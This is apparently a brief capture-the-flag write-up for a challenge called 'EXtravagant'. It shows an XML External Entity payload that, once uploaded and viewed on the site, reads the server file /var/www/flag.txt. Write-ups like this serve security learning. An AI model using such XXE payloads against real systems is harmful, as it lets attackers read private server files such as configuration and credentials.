# EXtravagant

## XEE - XML External Entity

We can upload a XML file on a website and then see it.

We inject the following code:
```XML
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/var/www/flag.txt"> ]>
<data>&example;</data>
```
When access on the website we are good :)